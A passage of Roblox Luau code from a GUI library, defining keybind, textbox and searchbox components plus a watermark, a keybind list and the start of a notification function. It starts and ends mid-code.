                    RenderStepped = RunService.RenderStepped:Connect(function()
                        Items["KeybindWindow"].Instance.Position = UDim2New(0, Items["KeyButton"].Instance.AbsolutePosition.X, 0, Items["KeyButton"].Instance.AbsolutePosition.Y + Items["KeyButton"].Instance.AbsoluteSize.Y + 5)
                    end)

                    if not Debounce then 
                        for Index, Value in Library.OpenFrames do 
                            if Value ~= Keybind then 
                                Value:SetOpen(false)
                            end
                        end

                        Library.OpenFrames[Keybind] = Keybind 
                    end
                else
                    if not Debounce then 
                        if Library.OpenFrames[Keybind] then 
                            Library.OpenFrames[Keybind] = nil
                        end
                    end

                    if RenderStepped then 
                        RenderStepped:Disconnect()
                        RenderStepped = nil
                    end
                end

                local Descendants = Items["KeybindWindow"].Instance:GetDescendants()
                TableInsert(Descendants, Items["KeybindWindow"].Instance)

                local NewTween

                for Index, Value in Descendants do 
                    local TransparencyProperty = Tween:GetProperty(Value)

                    if not TransparencyProperty then
                        continue 
                    end

                    if type(TransparencyProperty) == "table" then 
                        for _, Property in TransparencyProperty do 
                            NewTween = Tween:FadeItem(Value, Property, Bool, Library.FadeSpeed)
                        end
                    else
                        NewTween = Tween:FadeItem(Value, TransparencyProperty, Bool, Library.FadeSpeed)
                    end
                end
                
                NewTween.Tween.Completed:Connect(function()
                    Debounce = false 
                    Items["KeybindWindow"].Instance.Visible = Keybind.IsOpen
                    task.wait(0.2)
                    Items["KeybindWindow"].Instance.Parent = not Keybind.IsOpen and Library.UnusedHolder.Instance or Library.Holder.Instance
                end)
            end

            function Keybind:SetMode(Mode)
                for Index, Value in Modes do 
                    if Index == Mode then
                        Value:Tween(nil, {BackgroundTransparency = 0})
                    else
                        Value:Tween(nil, {BackgroundTransparency = 1})
                    end
                end

                Library.Flags[Keybind.Flag] = {
                    Mode = Keybind.Mode,
                    Key = Keybind.Key,
                    Toggled = Keybind.Toggled
                }

                if Data.Callback then 
                    Library:SafeCall(Data.Callback, Keybind.Toggled)
                end

                Update()
            end

            function Keybind:Press(Bool)
                if Keybind.Mode == "Toggle" then 
                    Keybind.Toggled = not Keybind.Toggled
                elseif Keybind.Mode == "Hold" then 
                    Keybind.Toggled = Bool
                elseif Keybind.Mode == "Always" then 
                    Keybind.Toggled = true
                end

                Library.Flags[Keybind.Flag] = {
                    Mode = Keybind.Mode,
                    Key = Keybind.Key,
                    Toggled = Keybind.Toggled
                }

                if Data.Callback then 
                    Library:SafeCall(Data.Callback, Keybind.Toggled)
                end

                Update()
            end

            Items["KeyButton"]:Connect("MouseButton1Click", function()
                Keybind.Picking = true 

                Items["KeyButton"].Instance.Text = "."
                Library:Thread(function()
                    local Count = 1

                    while true do 
                        if not Keybind.Picking then 
                            break
                        end

                        if Count == 4 then
                            Count = 1
                        end

                        Items["KeyButton"].Instance.Text = Count == 1 and "." or Count == 2 and ".." or Count == 3 and "..."
                        Count += 1
                        task.wait(0.5)
                    end
                end)

                local InputBegan
                InputBegan = UserInputService.InputBegan:Connect(function(Input)
                    if Input.UserInputType == Enum.UserInputType.Keyboard then 
                        Keybind:Set(Input.KeyCode)
                    else
                        Keybind:Set(Input.UserInputType)
                    end

                    InputBegan:Disconnect()
                    InputBegan = nil
                end)
            end)

            Items["KeyButton"]:Connect("MouseButton2Down", function()
                Keybind:SetOpen(not Keybind.IsOpen)
            end)

            Library:Connect(UserInputService.InputBegan, function(Input)
                if Keybind.Value == "None" then
                    return
                end

                if tostring(Input.KeyCode) == Keybind.Key then
                    if Keybind.Mode == "Toggle" then 
                        Keybind:Press()
                    elseif Keybind.Mode == "Hold" then 
                        Keybind:Press(true)
                    elseif Keybind.Mode == "Always" then 
                        Keybind:Press(true)
                    end
                elseif tostring(Input.UserInputType) == Keybind.Key then
                    if Keybind.Mode == "Toggle" then 
                        Keybind:Press()
                    elseif Keybind.Mode == "Hold" then 
                        Keybind:Press(true)
                    elseif Keybind.Mode == "Always" then 
                        Keybind:Press(true)
                    end
                end

                if Input.UserInputType == Enum.UserInputType.MouseButton1 then
                    if not Keybind.IsOpen then
                        return
                    end

                    if Library:IsMouseOverFrame(Items["KeybindWindow"]) then
                        return
                    end

                    Keybind:SetOpen(false)
                end
            end)

            Library:Connect(UserInputService.InputEnded, function(Input)
                if Keybind.Value == "None" then
                    return
                end

                if tostring(Input.KeyCode) == Keybind.Key then
                    if Keybind.Mode == "Hold" then 
                        Keybind:Press(false)
                    elseif Keybind.Mode == "Always" then 
                        Keybind:Press(true)
                    end
                elseif tostring(Input.UserInputType) == Keybind.Key then
                    if Keybind.Mode == "Hold" then 
                        Keybind:Press(false)
                    elseif Keybind.Mode == "Always" then 
                        Keybind:Press(true)
                    end
                end
            end)

            Items["Toggle"]:Connect("MouseButton1Down", function()
                Keybind.Mode = "Toggle"
                Keybind:SetMode("Toggle")
            end)

            Items["Hold"]:Connect("MouseButton1Down", function()
                Keybind.Mode = "Hold"
                Keybind:SetMode("Hold")
            end)

            Items["Always"]:Connect("MouseButton1Down", function()
                Keybind.Mode = "Always"
                Keybind:SetMode("Always")
            end)

            if Data.Default then
                Keybind:Set({Key = Data.Default, Mode = Data.Mode or "Toggle"})
            end

            Library.SetFlags[Keybind.Flag] = function(Value)
                Keybind:Set(Value)
            end

            return Keybind, Items 
        end

        Components.Textbox = function(self, Data)
            local Textbox = {
                Flag = Data.Flag,
                Value = ""
            }

            local Items = { } do
                Items["Textbox"] = Instances:Create("Frame", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 0, 40),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["Text"] = Instances:Create("TextLabel", {
                    Parent = Items["Textbox"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Data.Name,
                    BackgroundTransparency = 1,
                    Size = UDim2New(0, 0, 0, 15),
                    BorderSizePixel = 0,
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

                Items["Text"]:TextBorder()

                Items["Background"] = Instances:Create("Frame", {
                    Parent = Items["Textbox"].Instance,
                    Name = "\0",
                    AnchorPoint = Vector2New(0, 1),
                    Position = UDim2New(0, 0, 1, 0),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = UDim2New(1, 0, 0, 20),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(30, 36, 31)
                })  Items["Background"]:AddToTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})

                Instances:Create("UIGradient", {
                    Parent = Items["Background"].Instance,
                    Name = "\0",
                    Rotation = -165,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(208, 208, 208))}
                }):AddToTheme({Color = function()
                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme.Gradient)}
                end})

                Instances:Create("UIStroke", {
                    Parent = Items["Background"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                Items["Input"] = Instances:Create("TextBox", {
                    Parent = Items["Background"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    PlaceholderColor3 = FromRGB(185, 185, 185),
                    PlaceholderText = Data.Placeholder,
                    TextSize = 9,
                    Size = UDim2New(1, 0, 1, 0),
                    ClipsDescendants = true,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "",
                    TextColor3 = FromRGB(235, 235, 235),
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    Position = UDim2New(0, 0, 0, 0),
                    ClearTextOnFocus = false,
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Input"]:AddToTheme({TextColor3 = "Text", PlaceholderColor3 = "Placeholder Text"})

                Items["Input"]:TextBorder()

                Instances:Create("UIPadding", {
                    Parent = Items["Input"].Instance,
                    Name = "\0",
                    PaddingLeft = UDimNew(0, 8),
                    PaddingRight = UDimNew(0, 8)
                })
            end

            function Textbox:Get()
                return Textbox.Value
            end

            function Textbox:SetVisibility(Bool)
                Items["Textbox"].Instance.Visible = Bool
            end

            function Textbox:Set(Value)
                if Data.Numeric then
                    if (not tonumber(Value)) and StringLen(tostring(Value)) > 0 then
                        Value = Textbox.Value
                    end
                end

                Textbox.Value = Value
                Items["Input"].Instance.Text = Value
                Library.Flags[Textbox.Flag] = Value

                if Data.Callback then
                    Library:SafeCall(Data.Callback, Value)
                end
            end
            
            if Data.Finished then 
                Items["Input"]:Connect("FocusLost", function(PressedEnterQuestionMark)
                    if PressedEnterQuestionMark then
                        Textbox:Set(Items["Input"].Instance.Text)
                    end
                end)
            else
                Items["Input"].Instance:GetPropertyChangedSignal("Text"):Connect(function()
                    Textbox:Set(Items["Input"].Instance.Text)
                end)
            end

            if Data.Default then
                Textbox:Set(Data.Default)
            end

            Library.SetFlags[Textbox.Flag] = function(Value)
                Textbox:Set(Value)
            end

            return Textbox, Items
        end

        Components.Searchbox = function(self, Data) -- just pasted the entire dropdown fucntion with different instances, i cant be asked to make a whole new functionality
            local Dropdown = {
                Flag = Data.Flag, 
                Value = { },
                Options = { },
                IsOpen = false
            }

            local Items = { } do
                Items["Listbox"] = Instances:Create("Frame", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    BackgroundTransparency = 1,
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 0, 185),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["Search"] = Instances:Create("Frame", {
                    Parent = Items["Listbox"].Instance,
                    Name = "\0",
                    BackgroundTransparency = 0.4000000059604645,
                    Size = UDim2New(0, 0, 0, 20),
                    BorderColor3 = FromRGB(12, 12, 12),
                    BorderSizePixel = 2,
                    AutomaticSize = Enum.AutomaticSize.X,
                    BackgroundColor3 = FromRGB(14, 17, 15)
                })  Items["Search"]:AddToTheme({BorderColor3 = "Border", BackgroundColor3 = "Background"})

                Instances:Create("UIStroke", {
                    Parent = Items["Search"].Instance,
                    Name = "\0",
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
                    Transparency = 0.4000000059604645,
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter
                }):AddToTheme({Color = "Outline"})

                Items["Icon"] = Instances:Create("ImageLabel", {
                    Parent = Items["Search"].Instance,
                    Name = "\0",
                    ScaleType = Enum.ScaleType.Fit,
                    BorderColor3 = FromRGB(0, 0, 0),
                    AnchorPoint = Vector2New(0, 0.5),
                    Image = "rbxassetid://71197946135150",
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, 0, 0.5, 0),
                    Size = UDim2New(0, 16, 0, 16),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Icon"]:AddToTheme({ImageColor3 = "Text"})

                Items["Input"] = Instances:Create("TextBox", {
                    Parent = Items["Search"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "",
                    Size = UDim2New(0, 0, 1, 0),
                    Position = UDim2New(0, 22, 0, 0),
                    BorderSizePixel = 0,
                    BackgroundTransparency = 1,
                    PlaceholderColor3 = FromRGB(185, 185, 185),
                    AutomaticSize = Enum.AutomaticSize.X,
                    PlaceholderText = "search..",
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["Input"]:AddToTheme({TextColor3 = "Text", PlaceholderColor3 = "Placeholder Text"})

                Items["Input"]:TextBorder()

                Instances:Create("UIPadding", {
                    Parent = Items["Search"].Instance,
                    Name = "\0",
                    PaddingRight = UDimNew(0, 5),
                    PaddingLeft = UDimNew(0, 3)
                })

                Items["RealListbox"] = Instances:Create("Frame", {
                    Parent = Items["Listbox"].Instance,
                    Name = "\0",
                    ClipsDescendants = true,
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = UDim2New(1, 0, 1, -28),
                    SelectionGroup = true,
                    Position = UDim2New(0, 0, 0, 28),
                    Selectable = true,
                    Active = true,
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(30, 36, 31)
                })  Items["RealListbox"]:AddToTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})

                Instances:Create("UIStroke", {
                    Parent = Items["RealListbox"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                Instances:Create("UIGradient", {
                    Parent = Items["RealListbox"].Instance,
                    Name = "\0",
                    Rotation = -165,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(208, 208, 208))}
                }):AddToTheme({Color = function()
                    return RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, Library.Theme.Gradient)}
                end})

                Items["List"] = Instances:Create("ScrollingFrame", {
                    Parent = Items["RealListbox"].Instance,
                    Name = "\0",
                    Active = true,
                    AutomaticCanvasSize = Enum.AutomaticSize.Y,
                    BorderSizePixel = 0,
                    CanvasSize = UDim2New(0, 0, 0, 0),
                    ScrollBarImageColor3 = FromRGB(202, 243, 255),
                    MidImage = "rbxassetid://136419474381965",
                    BorderColor3 = FromRGB(0, 0, 0),
                    ScrollBarThickness = 2,
                    Size = UDim2New(1, -12, 1, -10),
                    Position = UDim2New(0, 3, 0, 5),
                    TopImage = "rbxassetid://136419474381965",
                    CanvasPosition = Vector2New(0, 57),
                    BottomImage = "rbxassetid://136419474381965",
                    BackgroundTransparency = 1,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["List"]:AddToTheme({ScrollBarImageColor3 = "Accent"})

                Instances:Create("UIListLayout", {
                    Parent = Items["List"].Instance,
                    Name = "\0",
                    Padding = UDimNew(0, 2),
                    SortOrder = Enum.SortOrder.LayoutOrder
                })

                Instances:Create("UIPadding", {
                    Parent = Items["List"].Instance,
                    Name = "\0",
                    PaddingBottom = UDimNew(0, 8),
                    PaddingLeft = UDimNew(0, 5),
                })
            end

            function Dropdown:Get()
                return Dropdown.Value
            end

            function Dropdown:SetVisibility(Bool)
                Items["Listbox"].Instance.Visible = Bool
            end

            function Dropdown:Set(Option)
                if Data.Multi then 
                    if type(Option) ~= "table" then 
                        return
                    end

                    Dropdown.Value = Option
                    Library.Flags[Dropdown.Flag] = Option

                    for Index, Value in Option do
                        local OptionData = Dropdown.Options[Value]
                        
                        if not OptionData then
                            continue
                        end

                        OptionData.Selected = true 
                        OptionData:Toggle("Active")
                    end
                else
                    if not Dropdown.Options[Option] then
                        return
                    end

                    local OptionData = Dropdown.Options[Option]

                    Dropdown.Value = Option
                    Library.Flags[Dropdown.Flag] = Option

                    for Index, Value in Dropdown.Options do
                        if Value ~= OptionData then
                            Value.Selected = false 
                            Value:Toggle("Inactive")
                        else
                            Value.Selected = true 
                            Value:Toggle("Active")
                        end
                    end
                end

                if Data.Callback then   
                    Library:SafeCall(Data.Callback, Dropdown.Value)
                end
            end

            function Dropdown:Add(Option)
                local OptionButton = Instances:Create("TextButton", {
                    Parent = Items["List"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = Option,
                    AutoButtonColor = false,
                    BorderSizePixel = 0,
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    Size = UDim2New(1, 0, 0, 20),
                    ZIndex = 1,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  OptionButton:AddToTheme({TextColor3 = "Text"})

                OptionButton:TextBorder()

                local OptionData = {
                    Button = OptionButton,
                    Name = Option,
                    Selected = false
                }

                function OptionData:Toggle(Status)
                    if Status == "Active" then 
                        OptionData.Button:ChangeItemTheme({TextColor3 = "Accent"})
                        OptionData.Button:Tween(nil, {TextColor3 = Library.Theme.Accent})
                    else
                        OptionData.Button:ChangeItemTheme({TextColor3 = "Text"}) 
                        OptionData.Button:Tween(nil, {TextColor3 = Library.Theme.Text})
                    end
                end

                function OptionData:Set()
                    OptionData.Selected = not OptionData.Selected

                    if Data.Multi then 
                        local Index = TableFind(Dropdown.Value, OptionData.Name)

                        if Index then 
                            TableRemove(Dropdown.Value, Index)
                        else
                            TableInsert(Dropdown.Value, OptionData.Name)
                        end

                        OptionData:Toggle(Index and "Inactive" or "Active")

                        Library.Flags[Dropdown.Flag] = Dropdown.Value
                    else
                        if OptionData.Selected then 
                            Dropdown.Value = OptionData.Name
                            Library.Flags[Dropdown.Flag] = OptionData.Name

                            OptionData.Selected = true
                            OptionData:Toggle("Active")

                            for Index, Value in Dropdown.Options do 
                                if Value ~= OptionData then
                                    Value.Selected = false 
                                    Value:Toggle("Inactive")
                                end
                            end
                        else
                            Dropdown.Value = nil
                            Library.Flags[Dropdown.Flag] = nil

                            OptionData.Selected = false
                            OptionData:Toggle("Inactive")
                        end
                    end

                    if Data.Callback then
                        Library:SafeCall(Data.Callback, Dropdown.Value)
                    end
                end

                OptionData.Button:Connect("MouseButton1Down", function()
                    OptionData:Set()
                end)

                Dropdown.Options[OptionData.Name] = OptionData
                return OptionData
            end

            function Dropdown:Remove(Option)
                if not Dropdown.Options[Option] then
                    return
                end

                Dropdown.Options[Option].Button:Clean()
                Dropdown.Options[Option] = nil
            end

            function Dropdown:Refresh(List)
                for Index, Value in Dropdown.Options do 
                    Dropdown:Remove(Value.Name)
                end

                for Index, Value in List do 
                    Dropdown:Add(Value)
                end
            end

            Items["Listbox"]:OnHover(function()
                Items["Listbox"]:ChangeItemTheme({BackgroundColor3 = "Hovered Element", BorderColor3 = "Border"})
                Items["Listbox"]:Tween(nil, {BackgroundColor3 = Library.Theme["Hovered Element"]})
            end)

            Items["Listbox"]:OnHoverLeave(function()
                Items["Listbox"]:ChangeItemTheme({BackgroundColor3 = "Element", BorderColor3 = "Border"})
                Items["Listbox"]:Tween(nil, {BackgroundColor3 = Library.Theme["Element"]})
            end)

            local SearchStepped

            Items["Input"]:Connect("Focused", function()
                SearchStepped = RunService.RenderStepped:Connect(function()
                    for Index, Value in Dropdown.Options do
                        if Items["Input"].Instance.Text ~= "" then
                            if StringFind(StringLower(Value.Name), StringLower(Items["Input"].Instance.Text)) then
                                Value.Button.Instance.Visible = true
                            else
                                Value.Button.Instance.Visible = false
                            end
                        else
                            Value.Button.Instance.Visible = true
                        end
                    end
                end)
            end)

            Items["Input"]:Connect("FocusLost", function()
                if SearchStepped then
                    SearchStepped:Disconnect()
                    SearchStepped = nil
                end
            end)

            for Index, Value in Data.Items do 
                Dropdown:Add(Value)
            end

            if Data.Default then 
                Dropdown:Set(Data.Default)
            end

            Library.SetFlags[Dropdown.Flag] = function(Value)
                Dropdown:Set(Value)
            end

            return Dropdown, Items 
        end
    end

    -- Library components
    Library.Watermark = function(self, Name)
        local Watermark = { }

        local Items = { } do 
            Items["Watermark"] = Instances:Create("Frame", {
                Parent = Library.Holder.Instance,
                Name = "\0",
                AnchorPoint = Vector2New(0.5, 1),
                Position = UDim2New(0.5, 0, 1, -12),
                BorderColor3 = FromRGB(12, 12, 12),
                BorderSizePixel = 2,
                AutomaticSize = Enum.AutomaticSize.XY,
                BackgroundColor3 = FromRGB(14, 17, 15)
            })  Items["Watermark"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Border"})

            Items["Watermark"]:MakeDraggable()

            Instances:Create("UIStroke", {
                Parent = Items["Watermark"].Instance,
                Name = "\0",
                Color = FromRGB(42, 49, 45),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Outline"})

            Instances:Create("UIPadding", {
                Parent = Items["Watermark"].Instance,
                Name = "\0",
                PaddingTop = UDimNew(0, 5),
                PaddingBottom = UDimNew(0, 7),
                PaddingRight = UDimNew(0, 5),
                PaddingLeft = UDimNew(0, 5)
            })

            Items["Text"] = Instances:Create("TextLabel", {
                Parent = Items["Watermark"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = Name,
                Position = UDim2New(0, 0, 0, 2),
                BackgroundTransparency = 1,
                TextXAlignment = Enum.TextXAlignment.Left,
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.XY,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Text"]:AddToTheme({TextColor3 = "Text"})

            Items["Text"]:TextBorder()

            Items["Liner"] = Instances:Create("Frame", {
                Parent = Items["Watermark"].Instance,
                Name = "\0",
                Position = UDim2New(0, -5, 0, -5),
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 10, 0, 1),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(202, 243, 255)
            })  Items["Liner"]:AddToTheme({BackgroundColor3 = "Accent"})
        end

        function Watermark:SetVisibility(Bool)
            Items["Watermark"].Instance.Visible = Bool
        end

        function Watermark:SetText(Text)
            if Items["Text"] and Items["Text"].Instance then
                Items["Text"].Instance.Text = tostring(Text or "")
            end
        end

        return Watermark
    end

    Library.KeybindList = function(self)
        local KeybindList = { }
        Library.KeyList = KeybindList

        local Items = { } do
            Items["KeybindList"] = Instances:Create("Frame", {
                Parent = Library.Holder.Instance,
                Name = "\0",
                AnchorPoint = Vector2New(0, 0.5),
                Position = UDim2New(0, 12, 0.5, 55),
                BorderColor3 = FromRGB(12, 12, 12),
                Size = UDim2New(0, 116, 0, 32),
                BorderSizePixel = 2,
                BackgroundColor3 = FromRGB(14, 17, 15)
            })  Items["KeybindList"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Border"})

            Items["KeybindList"]:MakeDraggable()

            Instances:Create("UIStroke", {
                Parent = Items["KeybindList"].Instance,
                Name = "\0",
                Color = FromRGB(42, 49, 45),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            }):AddToTheme({Color = "Outline"})

            Items["Title"] = Instances:Create("TextLabel", {
                Parent = Items["KeybindList"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = "Keybinds",
                Size = UDim2New(0, 0, 0, 20),
                BackgroundTransparency = 1,
                Position = UDim2New(0, 0, 0, -4),
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.X,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Title"]:AddToTheme({TextColor3 = "Text"})

            Items["Title"]:TextBorder()

            Instances:Create("UIPadding", {
                Parent = Items["KeybindList"].Instance,
                Name = "\0",
                PaddingTop = UDimNew(0, 8),
                PaddingBottom = UDimNew(0, 8),
                PaddingRight = UDimNew(0, 8),
                PaddingLeft = UDimNew(0, 8)
            })

            Items["Liner"] = Instances:Create("Frame", {
                Parent = Items["KeybindList"].Instance,
                Name = "\0",
                Position = UDim2New(0, 0, 0, 15),
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 0, 0, 1),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(202, 243, 255)
            })  Items["Liner"]:AddToTheme({BackgroundColor3 = "Accent"})

            Items["Content"] = Instances:Create("Frame", {
                Parent = Items["KeybindList"].Instance,
                Name = "\0",
                BorderColor3 = FromRGB(0, 0, 0),
                BackgroundTransparency = 1,
                Position = UDim2New(0, 0, 0, 32),
                Size = UDim2New(1, 0, 0, 0),
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.Y,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })

            Instances:Create("UIListLayout", {
                Parent = Items["Content"].Instance,
                Name = "\0",
                SortOrder = Enum.SortOrder.LayoutOrder
            })
        end

        function KeybindList:Add(Key, Name, Mode)
            local NewKey = Instances:Create("TextLabel", {
                Parent = Items["Content"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = "" ..Key .." - " ..Name .. " ("..Mode..")",
                BackgroundTransparency = 1,
                Size = UDim2New(0, 0, 0, 15),
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.X,
                TextTransparency = 1,
                Visible = false,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  NewKey:AddToTheme({TextColor3 = "Text"})

            NewKey:TextBorder()

            function NewKey:SetText(Key, Name, Mode)
                NewKey.Instance.Text = "" ..Key .." - " ..Name .. " ("..Mode..")"
            end

            function NewKey:SetStatus(Bool)
                if Bool then
                    NewKey.Instance.Visible = true
                    NewKey:Tween(nil, {TextTransparency = 0})
                else
                    NewKey:Tween(nil, {TextTransparency = 1}).Tween.Completed:Connect(function()
                        NewKey.Instance.Visible = false
                    end)
                end
            end

            return NewKey
        end

        function KeybindList:SetVisibility(Bool)
            Items["KeybindList"].Instance.Visible = Bool
        end

        return KeybindList
    end

    Library.Notification = function(self, Title, Description, Duration)
    Duration = (Duration or 5) + 0.1
    local Items = { } do 
            Items["Notification"] = Instances:Create("Frame", {
                Parent = Library.NotifHolder.Instance,
                Name = "\0",
                Size = UDim2New(0, 0, 0, 25),
                BorderColor3 = FromRGB(12, 12, 12),
                BorderSizePixel = 2,
                AutomaticSize = Enum.AutomaticSize.XY,
                BackgroundColor3 = FromRGB(14, 17, 15)
            })  Items["Notification"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Border"})

            Items["UIStroke1"] = Instances:Create("UIStroke", {
                Parent = Items["Notification"].Instance,
                Name = "\0",
                Color = FromRGB(42, 49, 45),
                LineJoinMode = Enum.LineJoinMode.Miter,
                ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            })  Items["UIStroke1"]:AddToTheme({Color = "Outline"})

            Instances:Create("UIPadding", {
                Parent = Items["Notification"].Instance,
                Name = "\0",
                PaddingTop = UDimNew(0, 5),
                PaddingBottom = UDimNew(0, 12),
                PaddingRight = UDimNew(0, 5),
                PaddingLeft = UDimNew(0, 5)
            })

            Items["Title"] = Instances:Create("TextLabel", {
                Parent = Items["Notification"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                BorderColor3 = FromRGB(0, 0, 0),
                Text = Title,
                BackgroundTransparency = 1,
                TextXAlignment = Enum.TextXAlignment.Left,
                BorderSizePixel = 0,
                AutomaticSize = Enum.AutomaticSize.XY,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Title"]:AddToTheme({TextColor3 = "Text"})

           Items["UIStroke2"] =  Items["Title"]:TextBorder()

            Items["Description"] = Instances:Create("TextLabel", {
                Parent = Items["Notification"].Instance,
                Name = "\0",
                FontFace = Library.Font,
                TextColor3 = FromRGB(235, 235, 235),
                TextTransparency = 0.4000000059604645,
                Text = Description,
                Position = UDim2New(0, 0, 0, 15),
                BorderSizePixel = 0,
                BackgroundTransparency = 1,
                TextXAlignment = Enum.TextXAlignment.Left,
                BorderColor3 = FromRGB(0, 0, 0),
                AutomaticSize = Enum.AutomaticSize.XY,
                TextSize = 9,
                BackgroundColor3 = FromRGB(255, 255, 255)
            })  Items["Description"]:AddToTheme({TextColor3 = "Text"})

            Items["UIStroke3"] = Items["Description"]:TextBorder()

            Items["Liner"] = Instances:Create("Frame", {
                Parent = Items["Notification"].Instance,
                Name = "\0",
                Position = UDim2New(0, 0, 1, 8),
                BorderColor3 = FromRGB(0, 0, 0),
                Size = UDim2New(1, 0, 0, 1),
                BorderSizePixel = 0,
                BackgroundColor3 = FromRGB(202, 243, 255)
            })  Items["Liner"]:AddToTheme({BackgroundColor3 = "Accent"})
        end

        local Size = Items["Notification"].Instance.AbsoluteSize

        for Index, Value in Items do 
            if Value.Instance:IsA("Frame") then
                Value.Instance.BackgroundTransparency = 1
            elseif Value.Instance:IsA("TextLabel") then 
                Value.Instance.TextTransparency = 1
            elseif Value.Instance:IsA("UIStroke") then
                Value.Instance.Transparency = 1
            end
        end 

        Items["Notification"].Instance.AutomaticSize = Enum.AutomaticSize.Y

        Library:Thread(function()
            for Index, Value in Items do 
                if Value.Instance:IsA("Frame") then
                    Value:Tween(nil, {BackgroundTransparency = 0})
                elseif Value.Instance:IsA("TextLabel") and Index ~= "Description" then 
                    Value:Tween(nil, {TextTransparency = 0})
                elseif Value.Instance:IsA("TextLabel") and Index == "Description" then 
                    Value:Tween(nil, {TextTransparency = 0.4})
                elseif Value.Instance:IsA("UIStroke") then
                    Value:Tween(nil, {Transparency = 0})
                end
            end

            Items["Notification"]:Tween(nil, {Size = UDim2New(0, Size.X, 0, 0)})
            Items["Liner"]:Tween(TweenInfo.new(Duration, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2New(0, 0, 0, 1)})
            
            task.delay(Duration + 0.1, function()
                for Index, Value in Items do 
                    if Value.Instance:IsA("Frame") then
                        Value:Tween(nil, {BackgroundTransparency = 1})
                    elseif Value.Instance:IsA("TextLabel") then 
